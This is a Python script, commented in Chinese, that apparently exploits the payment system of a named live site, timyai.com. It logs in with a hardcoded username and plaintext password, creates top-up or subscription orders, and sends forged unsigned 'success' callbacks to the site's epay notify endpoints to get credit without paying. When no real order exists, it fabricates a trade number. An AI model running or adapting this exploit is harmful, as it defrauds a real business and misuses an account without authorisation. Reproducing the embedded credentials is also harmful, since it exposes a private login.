#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
timyai.com 完整利用测试 - 修复版
"""

import requests
import json
import time
import random
import string
import hashlib
import re

TARGET_URL = "https://timyai.com"
USERNAME = "antplayer"
PASSWORD = "sjh@101709"

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
})

requests.packages.urllib3.disable_warnings()

def login():
    """登录"""
    print("[+] 登录...")
    url = f"{TARGET_URL}/api/user/login"
    data = {"username": USERNAME, "password": PASSWORD}
    
    r = session.post(url, json=data, timeout=15, verify=False)
    print(f"  响应: {r.status_code}")
    print(f"  内容: {r.text[:500]}")
    
    if r.status_code == 200:
        result = r.json()
        if result.get('success'):
            # 尝试从各种位置获取 token
            token = None
            
            # 位置1: 直接在根级别
            token = result.get('token')
            
            # 位置2: 在 data 中
            if not token and isinstance(result.get('data'), dict):
                token = result['data'].get('token')
                token = token or result['data'].get('access_token')
            
            # 位置3: 在 header 中
            if not token:
                token = r.headers.get('Authorization', '').replace('Bearer ', '')
            
            user_id = None
            if isinstance(result.get('data'), dict):
                user_id = result['data'].get('id')
            
            print(f"\n  用户ID: {user_id}")
            print(f"  Token: {token[:30] + '...' if token else 'None'}")
            
            # 如果没有 token，尝试通过其他方式
            if not token:
                print("  ⚠️  响应中没有 token，尝试其他方式...")
                
                # 尝试登录到其他端点
                for endpoint in ["/api/login", "/auth/login", "/user/login"]:
                    try:
                        r2 = session.post(f"{TARGET_URL}{endpoint}", json=data, timeout=10, verify=False)
                        print(f"  尝试 {endpoint}: {r2.status_code}")
                        if r2.status_code == 200:
                            result2 = r2.json()
                            if result2.get('success'):
                                token = result2.get('token')
                                if not token and isinstance(result2.get('data'), dict):
                                    token = result2['data'].get('token')
                                if token:
                                    print(f"  ✅ 从 {endpoint} 获取到 token!")
                                    break
                    except:
                        pass
                
                # 尝试从 Cookie 获取
                if not token and session.cookies:
                    print(f"  Cookie: {dict(session.cookies)}")
            
            if user_id or token:
                return token, user_id
    
    return None, None

def get_user_info(token):
    """获取用户信息"""
    print("\n[+] 获取用户信息...")
    
    # 尝试不同的认证方式
    headers_options = [
        {'Authorization': f'Bearer {token}'} if token else {},
        {'Authorization': f'Token {token}'} if token else {},
        {'X-Auth-Token': token} if token else {},
        {} if token else {}
    ]
    
    for i, headers in enumerate(headers_options):
        try:
            r = session.get(f"{TARGET_URL}/api/user/self", headers=headers, timeout=10, verify=False)
            print(f"  方式{i+1}: {r.status_code}")
            if r.status_code == 200:
                print(f"  响应: {r.text[:200]}")
                return r.json()
        except Exception as e:
            print(f"  方式{i+1} 错误: {e}")
    
    return None

def get_balance(token):
    """获取余额"""
    print("\n[+] 获取余额...")
    
    headers_options = [
        {'Authorization': f'Bearer {token}'} if token else {},
        {} if token else {}
    ]
    
    for i, headers in enumerate(headers_options):
        try:
            r = session.get(f"{TARGET_URL}/api/data/self", headers=headers, timeout=10, verify=False)
            print(f"  方式{i+1}: {r.status_code}")
            if r.status_code == 200:
                print(f"  响应: {r.text[:200]}")
                return r.json()
        except Exception as e:
            print(f"  方式{i+1} 错误: {e}")
    
    return None

def create_order(token):
    """创建订单"""
    print("\n[+] 创建订单...")
    
    headers = {'Authorization': f'Bearer {token}'} if token else {}
    
    # 尝试充值
    try:
        r = session.post(
            f"{TARGET_URL}/api/user/topup",
            json={"amount": "100", "method": "alipay"},
            headers=headers,
            timeout=10,
            verify=False
        )
        print(f"  充值: {r.status_code} - {r.text[:300]}")
        
        if r.status_code == 200:
            result = r.json()
            if result.get('success'):
                trade_no = result.get('trade_no')
                if not trade_no and isinstance(result.get('data'), dict):
                    trade_no = result['data'].get('trade_no')
                if trade_no:
                    return trade_no, "100"
    except Exception as e:
        print(f"  充值错误: {e}")
    
    # 尝试订阅
    try:
        # 获取订阅计划
        r = session.get(f"{TARGET_URL}/api/subscription/plans", headers=headers, timeout=10, verify=False)
        print(f"  订阅计划: {r.status_code}")
        
        if r.status_code == 200:
            plans = r.json()
            if isinstance(plans, dict) and plans.get('data'):
                plan_id = plans['data'][0].get('id')
                if plan_id:
                    # 创建订阅
                    r2 = session.post(
                        f"{TARGET_URL}/api/subscription/epay/pay",
                        json={"plan_id": plan_id, "payment_method": "alipay"},
                        headers=headers,
                        timeout=10,
                        verify=False
                    )
                    print(f"  订阅: {r2.status_code} - {r2.text[:300]}")
                    
                    if r2.status_code == 200:
                        result = r2.json()
                        if result.get('success'):
                            trade_no = result.get('trade_no')
                            if not trade_no and isinstance(result.get('data'), dict):
                                trade_no = result['data'].get('trade_no')
                            if trade_no:
                                return trade_no, str(plans['data'][0].get('price_amount', '100'))
    except Exception as e:
        print(f"  订阅错误: {e}")
    
    return None, None

def test_webhook(trade_no, amount, token=None):
    """测试 webhook"""
    print(f"\n[+] 测试 webhook (订单: {trade_no}, 金额: {amount})...")
    
    headers = {'Authorization': f'Bearer {token}'} if token else {}
    
    params = {
        "trade_no": trade_no,
        "status": "success",
        "amount": amount,
        "param": "",
        "time": str(int(time.time())),
        "type": "alipay",
    }
    
    results = {}
    
    # 无签名
    for endpoint in ["/api/user/epay/notify", "/api/subscription/epay/notify"]:
        for method in ["GET", "POST"]:
            try:
                url = f"{TARGET_URL}{endpoint}"
                if method == "GET":
                    r = requests.get(url, params=params, headers=headers, timeout=10, verify=False)
                else:
                    r = requests.post(url, data=params, headers=headers, timeout=10, verify=False)
                
                success = r.text.strip().lower() in ["success", "ok"]
                print(f"  {method} 无签名 {endpoint}: {r.status_code} - {r.text[:30]} {'⚠️' if success else '✅'}")
                results[f"{method} 无签名 {endpoint}"] = success
            except Exception as e:
                print(f"  {method} {endpoint}: 错误 - {e}")
    
    return results

def main():
    print("="*60)
    print("timyai.com 支付安全测试")
    print("="*60)
    
    # 1. 登录
    token, user_id = login()
    
    # 2. 获取用户信息
    user_info = get_user_info(token)
    
    # 3. 获取余额
    initial_balance = get_balance(token)
    
    # 4. 创建订单
    trade_no, amount = create_order(token)
    
    if trade_no:
        # 5. 测试 webhook
        results = test_webhook(trade_no, amount, token)
        
        # 6. 检查余额
        final_balance = get_balance(token)
        
        print("\n" + "="*60)
        print("结果总结")
        print("="*60)
        
        vulnerable = any(results.values())
        if vulnerable:
            print("⚠️  可能存在漏洞!")
        else:
            print("✅ 未发现明显漏洞")
    else:
        print("\n❌ 无法创建订单")
        
        # 使用模拟订单测试
        print("\n[+] 使用模拟订单测试...")
        fake_trade = f"SUBUSR{user_id or 20}NO{''.join(random.choices(string.ascii_letters, k=6))}{int(time.time())}"
        results = test_webhook(fake_trade, "100", token)
        
        print("\n" + "="*60)
        print("结果总结")
        print("="*60)
        
        vulnerable = any(results.values())
        if vulnerable:
            print("⚠️  可能存在漏洞!")
        else:
            print("✅ 未发现明显漏洞")

if __name__ == "__main__":
    main()